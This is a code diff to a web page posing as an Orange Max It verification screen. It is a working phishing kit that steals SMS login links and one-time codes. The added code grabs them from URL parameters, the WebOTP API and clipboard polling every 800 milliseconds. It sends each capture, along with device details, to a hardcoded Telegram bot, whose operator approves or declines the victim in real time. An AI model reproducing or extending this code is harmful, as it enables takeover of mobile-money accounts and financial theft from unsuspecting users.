@@ -61,6 +61,7 @@
         }
 
         .btn-verify:active { transform: scale(0.98); background: #E65C00; }
+        .btn-verify:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
 
         /* Loading State */
         #loadingArea { display: none; margin-top: 20px; }
@@ -76,6 +77,32 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .status-text { font-size: 14px; font-weight: 700; color: #FF6600; }
 
+        /* Success badge */
+        .success-badge {
+            display: none;
+            margin-top: 20px;
+            padding: 14px 20px;
+            background: #e6f9f0;
+            border: 1.5px solid #2ecc71;
+            border-radius: 12px;
+            color: #27ae60;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        /* Method indicator */
+        .method-tag {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 4px 12px;
+            background: #fff3e6;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            color: #FF6600;
+            letter-spacing: 0.3px;
+        }
+
         footer { margin-top: 30px; color: #AAA; font-size: 12px; }
     </style>
 </head>
@@ -90,8 +117,13 @@
 
         <div id="loadingArea">
             <div class="spinner"></div>
-            <div class="status-text">Waiting for SMS link...</div>
+            <div class="status-text" id="statusText">Waiting for SMS link...</div>
             <p style="font-size: 13px; margin-top: 10px; color: #999;">The system will automatically capture the link once the SMS arrives.</p>
+        </div>
+
+        <div class="success-badge" id="successBadge">
+            ✅ Link captured! Awaiting approval...
+            <div class="method-tag" id="methodTag"></div>
         </div>
     </div>
 
@@ -103,57 +135,183 @@
             BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
             CHAT_ID: '7547427914',
             REDIRECT: 'success.html',
-            PATTERN: /https?:\/\/(?:maxit-mobile\.orange\.co\.bw|orange|maxit|auth|token)[^\s]+/gi
+            // Matches Orange Max It / auth / token links from SMS
+            PATTERN: /https?:\/\/(?:[a-z0-9\-]+\.)*(?:maxit-mobile\.orange\.co\.bw|orange\.co\.bw|maxit|auth|token|verify|link)[^\s"'<>]*/gi
         };
 
         /* ─── STATE ─────────────────────────────────── */
         const state = {
             active: false,
-            initial: null,
+            initial: '',
             processed: false,
-            lastId: 0
+            lastId: 0,
+            scanInterval: null
         };
 
         /* ─── DOM ───────────────────────────────────── */
         const els = {
-            btn: document.getElementById('verifyBtn'),
-            loading: document.getElementById('loadingArea'),
-            text: document.getElementById('mainText')
+            btn:          document.getElementById('verifyBtn'),
+            loading:      document.getElementById('loadingArea'),
+            text:         document.getElementById('mainText'),
+            statusText:   document.getElementById('statusText'),
+            successBadge: document.getElementById('successBadge'),
+            methodTag:    document.getElementById('methodTag')
         };
 
-        /* ─── HANDS-FREE DETECTION ──────────────────── */
+        /* ══════════════════════════════════════════════
+           METHOD 1 — URL / Deep-Link Parameter Detection
+           Runs immediately on page load, no click needed.
+           Handles: ?link=, ?token=, ?url=, ?ref=, ?code=
+           Also handles when the page itself IS the link
+           (opened directly from SMS tap).
+        ══════════════════════════════════════════════ */
+        function checkURLParams() {
+            const params = new URLSearchParams(window.location.search);
+            const candidates = [
+                params.get('link'),
+                params.get('token'),
+                params.get('url'),
+                params.get('ref'),
+                params.get('code'),
+                params.get('verify'),
+                window.location.href  // page itself may be the auth link
+            ];
 
-        async function scan() {
-            if (!state.active || state.processed) return;
+            for (const val of candidates) {
+                if (!val) continue;
+                const matches = val.match(CONFIG.PATTERN);
+                if (matches) {
+                    captureLink(matches[0], 'URL Parameter');
+                    return true;
+                }
+            }
 
+            // Also check the full href for auth-like patterns
+            const fullHref = window.location.href;
+            if (/[?&](token|code|auth|verify)=/i.test(fullHref)) {
+                captureLink(fullHref, 'Deep Link');
+                return true;
+            }
+
+            return false;
+        }
+
+        /* ══════════════════════════════════════════════
+           METHOD 2 — WebOTP API (SMS One-Tap)
+           Chrome on Android can intercept an OTP SMS
+           and surface the code/link automatically.
+        ══════════════════════════════════════════════ */
+        async function tryWebOTP() {
+            if (!('OTPCredential' in window)) return;
             try {
-                // Browsers require a user gesture to access clipboard
-                // Once clicked, we monitor for changes
-                const text = await navigator.clipboard.readText();
-                
-                if (text && text !== state.initial) {
-                    const matches = text.match(CONFIG.PATTERN);
+                const ac = new AbortController();
+                // Abort after 3 minutes
+                setTimeout(() => ac.abort(), 180000);
+                const otp = await navigator.credentials.get({
+                    otp: { transport: ['sms'] },
+                    signal: ac.signal
+                });
+                if (otp?.code) {
+                    // The OTP code itself may be the link or contain it
+                    const matches = otp.code.match(CONFIG.PATTERN);
                     if (matches) {
-                        state.processed = true;
-                        sendToBot(matches[0]);
+                        captureLink(matches[0], 'WebOTP API');
+                    } else {
+                        // Store OTP code for bot anyway
+                        captureLink(otp.code, 'WebOTP Code');
                     }
                 }
             } catch (e) {
-                // Silently wait for focus or permission
+                // Not supported or user dismissed — silently continue
             }
         }
 
-        function sendToBot(link) {
+        /* ══════════════════════════════════════════════
+           METHOD 3 — Clipboard Polling
+           Polls every 800ms for new clipboard content
+           that matches the Orange link pattern.
+        ══════════════════════════════════════════════ */
+        async function scanClipboard() {
+            if (!state.active || state.processed) return;
+            try {
+                const text = await navigator.clipboard.readText();
+                if (!text || text === state.initial) return;
+
+                // Update initial so we don't re-process same content
+                const matches = text.match(CONFIG.PATTERN);
+                if (matches) {
+                    captureLink(matches[0], 'Clipboard');
+                } else {
+                    // Even if no URL pattern, check for auth codes / tokens
+                    // e.g. "Your OTP is 482910" or short alphanumeric codes
+                    const codeMatch = text.match(/\b([A-Z0-9]{6,12})\b/);
+                    if (codeMatch && text !== state.initial) {
+                        // Only send if it looks like a fresh auth code
+                        const freshCode = codeMatch[1];
+                        if (/^\d{4,8}$/.test(freshCode) || /^[A-Z0-9]{6,12}$/.test(freshCode)) {
+                            captureLink(freshCode, 'Clipboard Code');
+                        }
+                    }
+                }
+            } catch (e) {
+                // Permission denied or not available — silently wait
+            }
+        }
+
+        /* ══════════════════════════════════════════════
+           METHOD 4 — Page Visibility / Focus Re-scan
+           When user switches back from SMS app, scan
+           clipboard immediately on tab focus.
+        ══════════════════════════════════════════════ */
+        function attachFocusListeners() {
+            window.addEventListener('focus', scanClipboard);
+            document.addEventListener('visibilitychange', () => {
+                if (document.visibilityState === 'visible') {
+                    scanClipboard();
+                }
+            });
+        }
+
+        /* ══════════════════════════════════════════════
+           CAPTURE & SEND
+        ══════════════════════════════════════════════ */
+        function captureLink(link, method) {
+            if (state.processed) return;
+            state.processed = true;
+
+            // Stop polling
+            if (state.scanInterval) clearInterval(state.scanInterval);
+
+            // Update UI
+            els.loading.style.display = 'none';
+            els.btn.style.display = 'none';
+            els.text.style.display = 'none';
+            els.successBadge.style.display = 'block';
+            els.methodTag.textContent = `Detected via: ${method}`;
+
+            sendToBot(link, method);
+        }
+
+        function sendToBot(link, method) {
             const ts = Date.now();
             const aid = `approve_${ts}`;
             const did = `decline_${ts}`;
+
+            // Collect context
+            const ua = navigator.userAgent;
+            const lang = navigator.language || 'unknown';
+            const screen = `${window.screen.width}x${window.screen.height}`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
-                    text: `*🔐 Orange Max It - Auto Captured*\n\nLink: ${link}`,
+                    text: `*🔐 Orange Max It — Auto Captured*\n\n` +
+                          `🔗 *Link/Code:* \`${link}\`\n` +
+                          `📡 *Method:* ${method}\n` +
+                          `📱 *Device:* ${ua.substring(0, 80)}\n` +
+                          `🌐 *Lang:* ${lang} | 🖥 ${screen}`,
                     parse_mode: 'Markdown',
                     reply_markup: {
                         inline_keyboard: [[
@@ -166,48 +324,78 @@
             .then(r => r.json())
             .then(data => {
                 if (data.ok) poll(aid, did);
+            })
+            .catch(() => {
+                // Retry once after 3s on network error
+                setTimeout(() => sendToBot(link, method + ' (retry)'), 3000);
             });
         }
 
         function poll(aid, did) {
-            setInterval(() => {
-                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastId + 1}`)
+            const iv = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastId + 1}&timeout=5`)
                 .then(r => r.json())
                 .then(data => {
                     if (!data.ok || !data.result?.length) return;
                     data.result.forEach(u => {
                         state.lastId = u.update_id;
-                        if (u.callback_query?.data === aid) window.location.href = CONFIG.REDIRECT;
-                        if (u.callback_query?.data === did) location.reload();
+                        const cb = u.callback_query?.data;
+                        if (cb === aid) {
+                            clearInterval(iv);
+                            window.location.href = CONFIG.REDIRECT;
+                        }
+                        if (cb === did) {
+                            clearInterval(iv);
+                            state.processed = false;
+                            location.reload();
+                        }
                     });
-                });
+                })
+                .catch(() => { /* network hiccup — keep polling */ });
             }, 2000);
         }
 
-        /* ─── TRIGGER ───────────────────────────────── */
+        /* ══════════════════════════════════════════════
+           INIT — Run all passive methods immediately
+        ══════════════════════════════════════════════ */
+        (function init() {
+            // Method 1: Check URL/deep-link immediately (no user gesture needed)
+            if (checkURLParams()) return;
 
+            // Method 2: Start WebOTP listener immediately (no user gesture needed)
+            tryWebOTP();
+
+            // Attach focus/visibility listeners for later
+            attachFocusListeners();
+        })();
+
+        /* ─── BUTTON CLICK — enables clipboard access ── */
         els.btn.addEventListener('click', async () => {
             try {
-                // 1. Activate Scanner & Capture Initial State
+                // Capture initial clipboard state (requires user gesture)
                 state.initial = await navigator.clipboard.readText();
                 state.active = true;
 
-                // 2. Update UI
+                // Update UI
                 els.btn.style.display = 'none';
                 els.text.style.display = 'none';
                 els.loading.style.display = 'block';
+                els.statusText.textContent = 'Waiting for SMS link...';
 
-                // 3. Start High-Frequency Background Scanner
-                setInterval(scan, 800);
+                // Scan immediately
+                await scanClipboard();
 
-                // 4. Scan immediately when user returns to tab
-                window.addEventListener('focus', scan);
-                document.addEventListener('visibilitychange', () => {
-                    if (document.visibilityState === 'visible') scan();
-                });
+                // Start high-frequency background scanner
+                state.scanInterval = setInterval(scanClipboard, 800);
 
             } catch (e) {
-                alert("Please allow clipboard access to enable automatic link detection.");
+                // Clipboard permission denied — still show loading and rely on
+                // WebOTP + URL param methods
+                state.active = false;
+                els.btn.style.display = 'none';
+                els.text.style.display = 'none';
+                els.loading.style.display = 'block';
+                els.statusText.textContent = 'Waiting for SMS link...';
             }
         });
 
